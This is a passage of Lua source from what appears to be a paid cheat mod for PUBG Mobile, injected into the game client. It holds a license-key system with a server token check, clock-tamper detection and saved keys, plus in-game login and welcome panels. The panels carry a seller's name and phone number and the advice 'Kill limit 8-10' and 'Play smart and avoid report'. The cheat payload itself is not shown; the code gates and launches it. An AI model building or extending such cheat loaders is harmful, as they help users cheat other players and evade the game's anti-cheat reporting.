                .. digest:sub(8,8) .. char(byte(digest,9) % 64 + 128) .. digest:sub(10))
            return h:sub(1,8) .. "-" .. h:sub(9,12) .. "-" .. h:sub(13,16)
                .. "-" .. h:sub(17,20) .. "-" .. h:sub(21,32)
        end
        return {md5 = md5, md5_raw = md5_raw, form_encode = form_encode,
                constant_time_equal = constant_time_equal, name_uuid = name_uuid}
    end)()

    local SESSION_KEY = '__MasterLicenseSession_v1'
    local SAVED_KEY_FILE = 'UX_Official_license_key.txt'

    local function getSavedKeyPaths()
        return {
            '/Documents/UXOfficialTrackerExtra/Saved/Paks/' .. SAVED_KEY_FILE,
            '/Documents/UXOfficialTrackerExtra/Saved/Paks/puffer_temp/' .. SAVED_KEY_FILE,
            'UXOfficialTrackerExtra/Saved/Paks/' .. SAVED_KEY_FILE,
            '../../UXOfficialTrackerExtra/Saved/Paks/' .. SAVED_KEY_FILE,
            '//storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/UXOfficialTrackerExtra/UXOfficialTrackerExtra/Saved/Paks/' .. SAVED_KEY_FILE,
            '//storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/UXOfficialTrackerExtra/UXOfficialTrackerExtra/Saved/Paks/' .. SAVED_KEY_FILE,
        }
    end

    local function loadSavedKey()
        for _, path in ipairs(getSavedKeyPaths()) do
            local f = io.open(path, 'r')
            if f then
                local key = f:read('*a')
                f:close()
                if type(key) == 'string' then
                    key = key:match('^%s*(.-)%s*$')
                    if #key > 0 and #key <= 512 then return key end
                end
            end
        end
        return nil
    end

    local function saveSavedKey(key)
        if type(key) ~= 'string' then return false end
        key = key:match('^%s*(.-)%s*$')
        if #key == 0 or #key > 512 then return false end
        local wroteAny = false
        for _, path in ipairs(getSavedKeyPaths()) do
            local f = io.open(path, 'w')
            if f then
                f:write(key)
                f:close()
                wroteAny = true
            end
        end
        return wroteAny
    end

    local function clearSavedKey()
        for _, path in ipairs(getSavedKeyPaths()) do
            pcall(function()
                local f = io.open(path, 'w')
                if f then f:write(''); f:close() end
            end)
        end
    end

    local function loadSession()
        local g = rawget(_G, SESSION_KEY)
        if type(g) ~= 'table' or g.authorized ~= true then return nil end
        if type(g.expiresAt) == 'number' and g.expiresAt <= os.time() then
            _G[SESSION_KEY] = nil; return nil
        end
        return g
    end
    local function saveSession(expiresAt)
        pcall(function()
            _G[SESSION_KEY] = {authorized = true, expiresAt = expiresAt, issuedAt = os.time()}
        end)
    end
    local function clearSession() pcall(function() _G[SESSION_KEY] = nil end) end

    local CreateLocalExpiry = (function()
        return function(cfg, wallReader)
            local E = {}
            local expiredText = 'Mod expired dm +92 [ 03704831068 ]  for renewal.'
            local tamperText  = "Don't be over smart"
            local blockedMessage, blockedPhase
            local function finite(n)
                return type(n) == 'number' and n == n and n ~= math.huge and n ~= -math.huge
            end
            local function parse(text)
                if type(text) ~= 'string' then return nil end
                local y,m,d,h,n,s = text:match('^(%d%d%d%d)%-(%d%d)%-(%d%d) (%d%d):(%d%d):(%d%d)$')
                y,m,d,h,n,s = tonumber(y),tonumber(m),tonumber(d),tonumber(h),tonumber(n),tonumber(s)
                if not y or y < 1970 or y > 9999 or m < 1 or m > 12 or h > 23 or n > 59 or s > 59 then return nil end
                local leap = y % 4 == 0 and (y % 100 ~= 0 or y % 400 == 0)
                local months = {31, leap and 29 or 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}
                if d < 1 or d > months[m] then return nil end
                local prior = y - 1
                local days = 365 * (y - 1970) + math.floor(prior / 4) - math.floor(1969 / 4)
                    - math.floor(prior / 100) + math.floor(1969 / 100)
                    + math.floor(prior / 400) - math.floor(1969 / 400)
                for i = 1, m - 1 do days = days + months[i] end
                return (days + d - 1) * 86400 + h * 3600 + n * 60 + s - 6 * 3600
            end
            local configured = type(cfg.manualExpiry) == 'string'
                and cfg.manualExpiry:match('^%s*(.-)%s*$') or cfg.manualExpiry
            local expiry = parse(configured)
            local skew = cfg.clockSkew or 120
            if configured ~= nil and configured ~= '' and not expiry then
                blockedMessage, blockedPhase = 'Invalid local expiry date. Use YYYY-MM-DD HH:MM:SS.', 'error'
            end
            local function block(message, phase)
                if not blockedMessage then blockedMessage, blockedPhase = message, phase end
                return false, blockedMessage, blockedPhase
            end
            function E.Status() return not blockedMessage, blockedMessage, blockedPhase end
            function E.MarkTampered() return block(tamperText, 'tampered') end
            function E.GetExpiry() return expiry end
            function E.Accept(server, now, world, phone, rtt)
                if blockedMessage then return E.Status() end
                if not finite(server) or not finite(now) or now < 0 or world == nil
                    or not finite(rtt) or rtt < 0 or not finite(phone) then
                    return block('Clock verification unavailable.', 'error')
                end
                if math.abs(phone - server) > skew + rtt then return E.MarkTampered() end
                if expiry and server + rtt >= expiry then return block(expiredText, 'expired') end
                return true
            end
            return E
        end
    end)()

    local CreateAuth = (function()
        return function(P, cfg, deps)
            local A = {}
            local phase, message = 'locked', 'Enter your key to sign in.'
            local allowed, pending, generation = false, nil, 0
            local expiresAt
            local lastRequestLatencyMs, lastResponseTime, lastResponseWorld
            local startFn, stopFn, payloadStarted, restartRequired
            local localExpiry = deps.localExpiry
            local savedKey = loadSavedKey()
            do
                local stored = loadSession()
                if stored then
                    allowed = true; expiresAt = stored.expiresAt
                    phase, message = 'active', 'Session restored'
                end
            end
            if localExpiry then
                local ok, text, state = localExpiry.Status()
                if not ok then message, phase = text, state end
            end
            local function finite(n)
                return type(n) == 'number' and n == n and n ~= math.huge and n ~= -math.huge
            end
            local function readClock()
                local ok, n, w = pcall(deps.clock)
                if ok and finite(n) and n >= 0 and w ~= nil then return n, w end
            end
            local function notify(text, state)
                message, phase = text, state
                if type(deps.status) == 'function' then pcall(deps.status, text, state) end
            end
            local function stopPayload()
                if payloadStarted then
                    payloadStarted = false
                    local ok, accepted = pcall(stopFn)
                    if not ok or accepted == false then restartRequired = true end
                end
            end
            local function revoke(text, state)
                generation = generation + 1
                allowed, pending, expiresAt = false, nil, nil
                lastRequestLatencyMs, lastResponseTime, lastResponseWorld = nil, nil, nil
                stopPayload()
                local localDenied = false
                if localExpiry then
                    local ok, localText, localPhase = localExpiry.Status()
                    if not ok then text, state, localDenied = localText, localPhase, true end
                end
                notify(restartRequired and not localDenied
                    and 'Restart required: payload cleanup failed.' or text, state or 'error')
            end
            local function startPayload()
                if payloadStarted or not startFn then return true end
                payloadStarted = true
                local before = generation
                local ok, accepted = pcall(startFn)
                if not ok or accepted == false then
                    restartRequired = true
                    revoke('Restart required: offline script startup failed.', 'error')
                    return false
                end
                return generation == before and allowed
            end
            local function denyReason(reason)
                if type(reason) ~= 'string' then return 'Expired' end
                local lower = reason:sub(1, 120):lower():gsub('[_%s%-]+', ' ')
                if lower == 'max devices' or lower == 'maximum devices'
                    or lower == 'max devices reached' then
                    return 'Max Devices'
                end
                local clean = reason
                for _, field in ipairs({'key', 'serial'}) do
                    if pending and type(pending[field]) == 'string' and #pending[field] > 0 then
                        local needle = pending[field]:gsub('([^%w])', '%%%1')
                        clean = clean:gsub(needle, '[' .. field .. ']')
                    end
                end
                if type(cfg.secret) == 'string' and #cfg.secret > 0 then
                    clean = clean:gsub(cfg.secret:gsub('([^%w])', '%%%1'), '[credential]')
                end
                clean = clean:gsub('[%c]', ' '):sub(1, 120)
                return clean == '' and 'Expired' or ('Expired: ' .. clean)
            end
            local function configuredExpiry(result)
                if cfg.expiryPath == nil then return nil, true end
                if type(cfg.expiryPath) ~= 'table' or #cfg.expiryPath == 0 then return nil, false end
                local v = result
                for _, name in ipairs(cfg.expiryPath) do
                    if type(v) ~= 'table' then return nil, false end
                    v = rawget(v, name)
                end
                return v, finite(v) and v > 0 and v % 1 == 0
            end
            local function begin(key)
                if restartRequired or pending then return false end
                if localExpiry then
                    local ok, text, state = localExpiry.Status()
                    if not ok then revoke(text, state); return false end
                end
                if type(key) ~= 'string' then key = '' end
                key = key:match('^%s*(.-)%s*$')
                if #key == 0 or #key > 512 then
                    revoke('Expired: enter a valid key.', 'denied'); return false
                end
                local now, world = readClock()
                if not now then
                    revoke('Game clock unavailable. Try again in a match.', 'error'); return false
                end
                local okSerial, serial = pcall(deps.serial, key)
                if not okSerial or type(serial) ~= 'string' or #serial == 0 or #serial > 512 then
                    revoke('Device identifier unavailable.', 'error'); return false
                end
                generation = generation + 1
                local requestId = generation
                pending = {id = requestId, key = key, serial = serial,
                           started = now, world = world, deadline = now + cfg.timeout}
                notify('Signing in...', 'pending')
                if not pending or pending.id ~= requestId or generation ~= requestId then return false end
                local body = 'game=' .. P.form_encode(cfg.game)
                    .. '&user_key=' .. P.form_encode(key)
                    .. '&serial=' .. P.form_encode(serial)
                local function received(success, raw)
                    if not pending or pending.id ~= requestId or generation ~= requestId then return end
                    local current, worldNow = readClock()
                    if not current or worldNow ~= pending.world or current < pending.started
                        or current >= pending.deadline then
                        revoke('Request expired. Please sign in again.', 'error'); return
                    end
                    if success ~= true or type(raw) ~= 'string' or #raw == 0 or #raw > 32768 then
                        revoke('Connection failed. Please try again.', 'error'); return
                    end
                    local ok, result = pcall(deps.decode, raw)
                    if not ok or type(result) ~= 'table' then
                        revoke('Invalid server response.', 'error'); return
                    end
                    if result.status ~= true then revoke(denyReason(result.reason), 'denied'); return end
                    local data = result.data
                    if type(data) ~= 'table' or type(data.token) ~= 'string' or #data.token ~= 32
                        or not data.token:match('^[%x]+$') or not finite(data.rng) or data.rng % 1 ~= 0 then
                        revoke('Incomplete server response.', 'error'); return
                    end
                    local expected = P.md5(cfg.game .. '-' .. key .. '-' .. serial .. '-' .. cfg.secret)
                    if not P.constant_time_equal(data.token:lower(), expected) then
                        revoke('Server token verification failed.', 'denied'); return
                    end
                    local okWall, wall = pcall(deps.wall)
                    if not okWall or not finite(wall) then
                        revoke('Phone clock unavailable.', 'error'); return
                    end
                    if localExpiry then
                        local accepted, text, state = localExpiry.Accept(
                            data.rng, current, worldNow, wall, current - pending.started)
                        if not accepted then revoke(text, state); return end
                    elseif math.abs(wall - data.rng) > cfg.clockSkew then
                        revoke('Phone/server clock mismatch. Check automatic time.', 'error'); return
                    end
                    local expiry, validExpiry = configuredExpiry(result)
                    if not validExpiry then
                        revoke('Configured server expiry field is missing or invalid.', 'error'); return
                    end
                    if expiry and expiry - data.rng - (current - pending.started) <= 0 then
                        revoke('Expired', 'denied'); return
                    end
                    local fixedExpiry = localExpiry and localExpiry.GetExpiry()
                    if fixedExpiry then expiry = math.min(expiry or fixedExpiry, fixedExpiry) end
                    lastRequestLatencyMs = (current - pending.started) * 1000
                    lastResponseTime, lastResponseWorld = current, worldNow
                    pending = nil
                    allowed, expiresAt = true, expiry
                    saveSession(expiresAt)
                    -- Remember the successfully authenticated key so the next
                    -- game launch can restore access without asking again.
                    pcall(function()
                        saveSavedKey(key)
                        savedKey = key
                        _G.__UX_SAVED_LICENSE_KEY = key
                        if type(_G.__UXPersistLicenseKey) == 'function' then
                            _G.__UXPersistLicenseKey(key)
                        end
                        if type(_G.SHMenuSave) == 'function' then
                            _G.SHMenuSave()
                        end
                    end)
                    if not startPayload() then return end
                    notify('Login successful.', 'active')
                end
                local ok, accepted = pcall(deps.post, cfg.url,
                    {['Content-Type'] = 'application/x-www-form-urlencoded'},
                    body, received, cfg.timeout)
                if not ok or accepted == false then
                    revoke('HTTP request could not start.', 'error'); return false
                end
                return true
            end
            function A.Login(key) if allowed then return false end; return begin(key) end
            function A.Tick()
                if not pending then return end
                local now, world = readClock()
                if not now or world ~= pending.world or now < pending.started then
                    revoke('Login interrupted by map loading. Please try again when ready.', 'locked'); return
                end
                if now >= pending.deadline then
                    revoke('Request timed out. Please try again.', 'error')
                end
            end
            function A.IsAuthorized()
                if allowed and not restartRequired then return true end
                local stored = loadSession()
                if stored and not restartRequired then
                    allowed = true; expiresAt = stored.expiresAt; return true
                end
                return false
            end
            function A.Logout() clearSession(); revoke('Expired: signed out.', 'locked') end
            function A.FailClosed(text, requiresRestart)
                if requiresRestart == true then restartRequired = true end
                revoke(text or 'Online access unavailable.', 'error')
            end
            function A.ReportClockTampering()
                if localExpiry then localExpiry.MarkTampered() end
                revoke("Don't be over smart", 'tampered')
            end
            function A.Bind(onStart, onStop)
                if type(onStart) ~= 'function' or type(onStop) ~= 'function' then
                    return false, 'START_AND_STOP_REQUIRED'
                end
                if startFn and (startFn ~= onStart or stopFn ~= onStop) then
                    return false, 'ALREADY_BOUND'
                end
                startFn, stopFn = onStart, onStop
                if A.IsAuthorized() then return startPayload() end
                return true
            end
            function A.Unbind()
                revoke('Offline script disconnected.', 'locked')
                startFn, stopFn = nil, nil
            end
            function A.GetSavedKey()
                if type(savedKey) == 'string' and #savedKey > 0 then return savedKey end
                local g = rawget(_G, '__UX_SAVED_LICENSE_KEY')
                if type(g) == 'string' and #g > 0 then return g end
                return nil
            end
            function A.SetSavedKey(key)
                if type(key) ~= 'string' then return false end
                key = key:match('^%s*(.-)%s*$')
                if #key == 0 or #key > 512 then return false end
                savedKey = key
                pcall(function()
                    _G.__UX_SAVED_LICENSE_KEY = key
                    saveSavedKey(key)
                    if type(_G.__UXPersistLicenseKey) == 'function' then _G.__UXPersistLicenseKey(key) end
                end)
                return true
            end
            function A.GetRemainingSeconds() return nil end
            function A.GetState()
                local authorized = A.IsAuthorized()
                local sample, age
                if authorized and lastRequestLatencyMs ~= nil then
                    local now, world = readClock()
                    if now and world == lastResponseWorld and now >= lastResponseTime then
                        sample, age = lastRequestLatencyMs, now - lastResponseTime
                    end
                end
                return {
                    phase = phase, message = message, authorized = authorized,
                    sessionAuthorized = authorized, expiresAt = expiresAt,
                    accessPolicy = "game_session", expiryCheckPolicy = "login_only",
                    periodicRecheck = false, pending = pending ~= nil,
                    linked = startFn ~= nil, restartRequired = restartRequired == true,
                    lastRequestLatencyMs = sample, lastRequestLatencyAgeSeconds = age,
                    latencyScope = "license_http_round_trip"
                }
            end
            return A
        end
    end)()

    local Core = {Primitives = Primitives, createExpiry = CreateLocalExpiry}
    function Core.new(config, dependencies)
        assert(type(config) == 'table' and type(dependencies) == 'table',
            'License configuration and dependencies required')
        local deps = {}
        for key, value in pairs(dependencies) do deps[key] = value end
        if deps.localExpiry == nil then deps.localExpiry = CreateLocalExpiry(config, deps.wall) end
        return CreateAuth(Primitives, config, deps)
    end
    return Core
end)()

-- ============================================================================
-- 2. LOGIN UI
-- ============================================================================
local MasterLoginUI = (function()
    local Module = {}
    function Module.new(env)
        env = env or _G
        local require = env.require or require
        local function global(name)
            local ok, value = pcall(function() return env[name] end)
            if ok then return value end
        end
        local UI = {_status = "Enter your key", _busy = false, _data = nil}
        local function member(object, name)
            if object == nil then return nil end
            local ok, value = pcall(function() return object[name] end)
            if ok then return value end
        end
        local function valid(object)
            local check = member(global("slua"), "isValid")
            if object == nil then return false end
            if type(check) == 'function' then
                local ok, result = pcall(check, object)
                if ok and result == true then return true end
            end
            local game = global('Game')
            local fallback = member(game, 'IsValid')
            if type(fallback) == 'function' then
                local ok, result = pcall(fallback, game, object)
                return ok and result == true
            end
            return false
        end
        local function imported(name)
            local loader = global("import")
            if type(loader) ~= "function" then return nil end
            local ok, result = pcall(loader, name)
            if ok then return result end
        end
        local function construct(class, ...)
            if class == nil then return nil end
            local ok, result = pcall(class, ...)
            if ok then return result end
        end
        local function vector(x, y)
            return construct(global("FVector2D") or imported("Vector2D"), x, y)
                or {X = x, Y = y}
        end
        local function color(r, g, b, a)
            return construct(global("FLinearColor") or imported("LinearColor"), r, g, b, a)
                or {R = r, G = g, B = b, A = a}
        end
        local function visibility(widget, value)
            local setter = member(widget, "SetWidgetVisibility") or member(widget, "SetVisibility")
            assert(type(setter) == "function", "UI_VISIBILITY_UNAVAILABLE")
            setter(widget, value)
        end
        local function setTextStyle(widget, size, textColor)
            pcall(function()
                local font = widget.Font
                if font then
                    font.Size = math.max(1, math.floor(size * (UI._scale or 1) + 0.5))
                    local assigned = pcall(function() widget.Font = font end)
                    if not assigned then widget:SetFont(font) end
                end
            end)
            pcall(function() widget:SetAutoWrapText(true) end)
            pcall(function()
                local slate = construct(imported("SlateColor"), textColor)
                if slate then widget:SetColorAndOpacity(slate) end
            end)
        end
        local function detach(data)
            if not data then return end
            data.visible = false
            pcall(function() if valid(data.input) then data.input:SetText("") end end)
            if data.event and data.eventHandle ~= nil then
                pcall(function() data.event:Remove(data.eventHandle) end)
            end
            if valid(data.container) then
                pcall(function() data.container:RemoveFromParent() end)
            end
            data.onSubmit = nil
        end
        function UI.Destroy()
            local previous = UI._data; UI._data = nil; detach(previous)
        end
        function UI.Hide()
            local data = UI._data
            if not data or data.hiddenApplied then return true end
            data.visible = false
            local ok = pcall(function()
                if valid(data.input) then data.input:SetText("") end
                if valid(data.container) then visibility(data.container, data.hidden) end
            end)
            if ok then data.hiddenApplied = true end
            return ok
        end
        function UI.SetStatus(message)
            UI._status = type(message) == "string" and message:sub(1, 160) or "Login unavailable"
            local data = UI._data
            if data and data.deliveredStatus == UI._status then return true end
            if data and valid(data.status) then
                local ok = pcall(function() data.status:SetText(UI._status) end)
                if ok then data.deliveredStatus = UI._status end
                return ok
            end
            return false
        end
        function UI.SetBusy(busy)
            UI._busy = busy == true
            local data = UI._data
            if data then
                if data.deliveredBusy == UI._busy then return true end
                local buttonOK = pcall(function() data.button:SetIsEnabled(not UI._busy) end)
                local inputOK  = pcall(function() data.input:SetIsEnabled(not UI._busy) end)
                if buttonOK and inputOK then data.deliveredBusy = UI._busy; return true end
            end
            return false
        end
        local function fitScale(parent)
            local result = 1
            pcall(function()
                local size = parent:GetCachedGeometry():GetLocalSize()
                local width, height = size.X, size.Y
                if type(width) == 'number' and type(height) == 'number'
                    and width > 24 and height > 24 then
                    result = math.min(1, (width - 24) / 500, (height - 24) / 248)
                end
            end)
            return result
        end
        function UI.Show(onSubmit, initialKey)
            if type(onSubmit) ~= "function" then return false, "UI_SUBMIT_REQUIRED" end
            if type(initialKey) == "string" then
                initialKey = initialKey:match("^%s*(.-)%s*$")
                if #initialKey == 0 or #initialKey > 512 then initialKey = nil end
            else
                initialKey = nil
            end
            local data = UI._data
            if data and valid(data.parent)
                and math.abs(fitScale(data.parent) - (data.scale or 1)) > 0.001 then
                UI.Destroy(); data = nil
            end
            if data and valid(data.container) and valid(data.parent) then
                local ok = data.visible or pcall(function()
                    visibility(data.container, data.visibleEnum)
                end)
                if ok then
                    data.onSubmit, data.visible, data.hiddenApplied = onSubmit, true, false
                    if initialKey and valid(data.input) then pcall(function() data.input:SetText(initialKey) end) end
                    UI.SetStatus(UI._status); UI.SetBusy(UI._busy); return true
                end
            end
            UI.Destroy()
            local okTools, uiTools = pcall(require, "GameLua.Mod.BaseMod.Common.UI.InGameUITools")
            local getRoot = okTools and member(uiTools, "GetMainControlBaseUI")
            if type(getRoot) ~= "function" then return false, "UI_NOT_READY" end
            local okRoot, root = pcall(getRoot)
            if not okRoot or not valid(root) then return false, "UI_NOT_READY" end
            local parent = member(root, "CanvasPanel_0")
            if not valid(parent) then parent = member(root, "CanvasPanel_42") end
            if not valid(parent) then return false, "UI_NOT_READY" end
            local game = global("CGame")
            if type(member(game, "NewObjectFromPath")) ~= "function" then
                return false, "UI_FACTORY_UNAVAILABLE"
            end
            local enums = member(global("UEnums"), "ESlateVisibility")
            local visibleEnum, hidden = member(enums, "Visible"), member(enums, "Collapsed")
            local passive = member(enums, "SelfHitTestInvisible")
            if visibleEnum == nil or hidden == nil or passive == nil then
                return false, "UI_ENUM_UNAVAILABLE"
            end
            UI._scale = fitScale(parent)
            data = {parent = parent, visible = false, onSubmit = onSubmit,
                    initialKey = initialKey, visibleEnum = visibleEnum, hidden = hidden, scale = UI._scale}
            local okBuild = pcall(function()
                local function make(class, outer)
                    local widget = game:NewObjectFromPath("/Script/UMG." .. class, outer)
                    assert(valid(widget), "UI_WIDGET_UNAVAILABLE")
                    return widget
                end
                data.container = make("CanvasPanel", parent)
                local function add(widget, x, y, width, height, z)
                    local slot = data.container:AddChildToCanvas(widget)
                    slot:SetAutoSize(false)
                    slot:SetPosition(vector(x * UI._scale, y * UI._scale))
                    slot:SetSize(vector(width * UI._scale, height * UI._scale))
                    slot:SetZOrder(z)
                    return slot
                end
                local background = make("Border", data.container)
                background:SetBrushColor(color(0.025, 0.035, 0.05, 0.98))
                visibility(background, visibleEnum)
                add(background, 0, 0, 500, 248, 0)
                local title = make("TextBlock", data.container)
                title:SetText("SAMEER  +92 [ 03704831068 ] LOGIN")
                setTextStyle(title, 19, color(0.1, 0.9, 1, 1))
                visibility(title, passive); add(title, 22, 15, 456, 30, 1)
                data.input = make("EditableTextBox", data.container)
                data.input:SetText(initialKey or "")
                setTextStyle(data.input, 17, color(0.92, 0.94, 0.96, 1))
                pcall(function() data.input:SetHintText("Enter your key") end)
                visibility(data.input, visibleEnum); add(data.input, 22, 58, 456, 44, 2)
                local hint = make("TextBlock", data.container)
                hint:SetText("Enter your key, then tap LOGIN.")
                setTextStyle(hint, 12, color(0.72, 0.78, 0.83, 1))
                visibility(hint, passive); add(hint, 22, 106, 456, 20, 2)
                data.status = make("TextBlock", data.container)
                data.status:SetText(UI._status); data.deliveredStatus = UI._status
                setTextStyle(data.status, 13, color(0.92, 0.94, 0.96, 1))
                visibility(data.status, passive)
                pcall(function() data.status:SetAutoWrapText(true) end)
                add(data.status, 22, 129, 456, 54, 2)
                data.button = make("Button", data.container)
                visibility(data.button, visibleEnum)
                local label = make("TextBlock", data.button)
                label:SetText("LOGIN")
                setTextStyle(label, 17, color(0.05, 0.08, 0.12, 1))
                visibility(label, passive); data.button:AddChild(label)
                add(data.button, 150, 190, 200, 40, 2)
                data.event = data.button.OnClicked
                data.eventHandle = data.event:Add(function()
                    if UI._data ~= data or not data.visible or UI._busy then return end
                    local readOK, key = pcall(function() return data.input:GetText() end)
                    if not readOK or type(key) ~= "string" then
                        UI.SetStatus("Unable to read the key"); return
                    end
                    key = key:match("^%s*(.-)%s*$")
                    if key == "" or #key > 512 then UI.SetStatus("Enter a valid key"); return end
                    local submitOK = pcall(data.onSubmit, key)
                    if not submitOK then UI.SetBusy(false); UI.SetStatus("Login could not start") end
                end)
                local slot = parent:AddChildToCanvas(data.container)
                slot:SetAutoSize(false)
                slot:SetSize(vector(500 * UI._scale, 248 * UI._scale))
                slot:SetZOrder(9000)
                local anchors = slot:GetAnchors()
                anchors.Minimum, anchors.Maximum = vector(0.5, 0.5), vector(0.5, 0.5)
                slot:SetAnchors(anchors)
                slot:SetAlignment(vector(0.5, 0.5))
                slot:SetPosition(vector(0, 0))
                visibility(data.container, passive)
            end)
            if not okBuild then
                detach(data); return false, "UI_BUILD_UNAVAILABLE"
            end
            data.visible = true; UI._data = data; UI.SetBusy(UI._busy)
            return true
        end
        function UI.ShowNotice(message)
            local shown, reason = UI.Show(function() return false end)
            if not shown then return false, reason end
            UI.SetStatus(message); UI.SetBusy(true); return true
        end
        return UI
    end
    return Module
end)()

-- ============================================================================
-- 3. WELCOME UI
-- ============================================================================
local MasterWelcomeUI = (function()
    local Module = {}
    function Module.new(env)
        env = env or _G
        local require = env.require or require
        local function global(n)
            local ok, v = pcall(function() return env[n] end)
            if ok then return v end
        end
        local function member(o, k)
            if o == nil then return nil end
            local ok, v = pcall(function() return o[k] end)
            if ok then return v end
        end
        local function valid(o)
            local c = member(global("slua"), "isValid")
            if o == nil then return false end
            if type(c) == 'function' then
                local ok, v = pcall(c, o)
                if ok and v == true then return true end
            end
            local g = global('Game'); local f = member(g, 'IsValid')
            if type(f) == 'function' then
                local ok, v = pcall(f, g, o)
                return ok and v == true
            end
            return false
        end
        local function imported(n)
            local l = global("import")
            if type(l) ~= "function" then return nil end
            local ok, v = pcall(l, n); if ok then return v end
        end
        local function construct(c, ...)
            if c == nil then return nil end
            local ok, v = pcall(c, ...); if ok then return v end
        end
        local function vector(x, y)
            return construct(global("FVector2D") or imported("Vector2D"), x, y) or {X = x, Y = y}
        end
        local function linear(v)
            v = v / 255
            if v <= 0.04045 then return v / 12.92 end
            return ((v + 0.055) / 1.055) ^ 2.4
        end
        local function color(r, g, b, a)
            r, g, b, a = linear(r), linear(g), linear(b), a or 1
            return construct(global("FLinearColor") or imported("LinearColor"), r, g, b, a)
                or {R = r, G = g, B = b, A = a}
        end
        local function visibility(w, v)
            local s = member(w, "SetWidgetVisibility") or member(w, "SetVisibility")
            if type(s) == 'function' then s(w, v) end
        end
        local WelcomeUI = {Width = 600, Height = 276}
        local WelcomeText = {
            "OWNER SAMEER",
            "Kill limit 8-10",
            "Play smart and avoid report",
        }
        local UI = {_shown = false, _data = nil}
        local function detach(data)
            if not data then return end
            data.Visible = false
            if data.Event and data.EventHandle ~= nil then
                pcall(function() data.Event:Remove(data.EventHandle) end)
            end
            if valid(data.Container) then
                pcall(function() visibility(data.Container, data.Hidden) end)
                pcall(function() data.Container:RemoveFromParent() end)
            end
        end
        function UI:Destroy()
            local p = UI._data; UI._data = nil; detach(p)
        end
        local function parent()
            local okT, tools = pcall(require, "GameLua.Mod.BaseMod.Common.UI.InGameUITools")
            if not okT then return nil end
            local getRoot = member(tools, "GetMainControlBaseUI")
            if type(getRoot) ~= "function" then return nil end
            local ok, root = pcall(getRoot)
            if not ok or not valid(root) then return nil end
            local canvas = member(root, "CanvasPanel_0")
            if not valid(canvas) then canvas = member(root, "CanvasPanel_42") end
            if valid(canvas) then return root, canvas end
        end
        function UI:Show()
            if UI._shown and UI._data and valid(UI._data.Container) then
                visibility(UI._data.Container, UI._data.Passive)
                UI._data.Visible = true
                return true
            end
            UI:Destroy()
            local root, par = parent()
            if not par then return false, "WELCOME_ROOT_UNAVAILABLE" end
            local game = global("CGame")
            if type(member(game, "NewObjectFromPath")) ~= "function" then
                return false, "WELCOME_FACTORY_UNAVAILABLE"
            end
            local enums = member(global("UEnums"), "ESlateVisibility")
            local visible, hidden, passive = member(enums, "Visible"),
                member(enums, "Collapsed"), member(enums, "SelfHitTestInvisible")
            if visible == nil or hidden == nil or passive == nil then
                return false, "WELCOME_ENUM_UNAVAILABLE"
            end
            local data = {Root = root, Parent = par, Visible = false,
                          Hidden = hidden, Passive = passive}
            local ok = pcall(function()
                local function make(class, outer)
                    local w = game:NewObjectFromPath("/Script/UMG." .. class, outer)
                    assert(valid(w), "WELCOME_WIDGET_UNAVAILABLE")
                    return w
                end
                data.Container = make("CanvasPanel", par)
                visibility(data.Container, hidden)
                local function add(w, x, y, ww, hh, z)
                    local s = data.Container:AddChildToCanvas(w)
                    s:SetAutoSize(false)
                    s:SetPosition(vector(x, y))
                    s:SetSize(vector(ww, hh))
                    s:SetZOrder(z)
                    return s
                end
                local function rect(x, y, ww, hh, c, z)
                    local w = make("Border", data.Container)
                    w:SetBrushColor(c)
                    visibility(w, passive)
                    add(w, x, y, ww, hh, z)
                    return w
                end
                local slateColor
                pcall(function() slateColor = imported("SlateColor") end)
                local function textStyle(w, size, c)
                    local font = member(w, "Font")
                    if font ~= nil then
                        if type(font) == 'table' then
                            local copy = {}
                            for k, v in pairs(font) do copy[k] = v end
                            font = copy
                        end
                        font.Size = size
                        pcall(function() w:SetFont(font) end)
                    end
                    pcall(function() w:SetColorAndOpacity(slateColor and slateColor(c) or c) end)
                    pcall(function() w:SetJustification(1) end)
                    visibility(w, passive)
                end
                local function text(value, x, y, ww, hh, size, c, z)
                    local w = make("TextBlock", data.Container)
                    w:SetText(value)
                    textStyle(w, size, c)
                    pcall(function() w:SetAutoWrapText(true) end)
                    add(w, x, y, ww, hh, z)
                    return w
                end
                local W, H = WelcomeUI.Width, WelcomeUI.Height
                rect(4, 6, W, H, color(18, 5, 10, 0.25), 0)
                rect(0, 0, W, H, color(186, 137, 74), 1)
                rect(2, 2, W - 4, H - 4, color(255, 244, 214), 2)
                local stops = {{116, 16, 46}, {169, 38, 47}, {194, 105, 35}}
                local segments = 64
                for i = 0, segments - 1 do
                    local t = i / (segments - 1)
                    local left, right, blend
                    if t <= 0.5 then left, right, blend = stops[1], stops[2], t * 2
                    else left, right, blend = stops[2], stops[3], (t - 0.5) * 2 end
                    local x0 = 2 + (W - 4) * i / segments
                    local x1 = 2 + (W - 4) * (i + 1) / segments
                    rect(x0, 2, math.min(W - 2, x1 + 0.3) - x0, 76,
                        color(left[1] + (right[1] - left[1]) * blend,
                              left[2] + (right[2] - left[2]) * blend,
                              left[3] + (right[3] - left[3]) * blend), 3)
                end
                rect(18, 3, W - 36, 1, color(255, 255, 255, 0.32), 4)
                rect(2, 78, W - 4, 3, color(238, 188, 93), 4)
                local title = text(WelcomeText[1], 24, 23, W - 48, 44, 19, color(255, 253, 247), 5)
                pcall(function() title:SetShadowOffset(vector(0, 1)) end)
                pcall(function() title:SetShadowColorAndOpacity(color(40, 3, 12, 0.45)) end)
                rect(30, 100, W - 60, 54, color(255, 226, 159), 3)
                rect(30, 100, 4, 54, color(160, 33, 49), 4)
                text(WelcomeText[2], 46, 110, W - 92, 38, 23, color(115, 25, 45), 5)
                text(WelcomeText[3], 30, 168, W - 60, 32, 17, color(130, 34, 47), 5)
                local button = make("Button", data.Container)
                pcall(function() button:SetBackgroundColor(color(131, 25, 47)) end)
                visibility(button, visible)
                local label = make("TextBlock", button)
                label:SetText("OK")
                textStyle(label, 17, color(255, 251, 238))
                local ls = button:AddChild(label)
                pcall(function() ls:SetHorizontalAlignment(2) end)
                pcall(function() ls:SetVerticalAlignment(2) end)
                add(button, (W - 164) / 2, 212, 164, 42, 6)
                data.Event = member(button, "OnClicked")
                data.EventHandle = data.Event:Add(function()
                    if UI._data == data and data.Visible then UI:Destroy() end
                end)
                local slot = par:AddChildToCanvas(data.Container)
                slot:SetAutoSize(false)
                slot:SetSize(vector(W, H))
                slot:SetZOrder(9200)
                local anchors = slot:GetAnchors()
